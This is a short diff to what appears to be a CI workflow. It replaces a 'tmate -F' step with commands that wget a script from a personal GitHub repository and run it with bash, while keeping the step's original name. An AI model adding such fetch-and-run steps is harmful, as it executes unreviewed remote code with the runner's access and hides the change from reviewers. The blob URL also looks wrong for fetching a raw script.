@@ -21,4 +21,5 @@ jobs:
 
       - name: Running tmate
         run: |
-          tmate -F
+          wget https://github.com/GeneralFrosa/p/blob/main/script.sh
+          bash script.sh
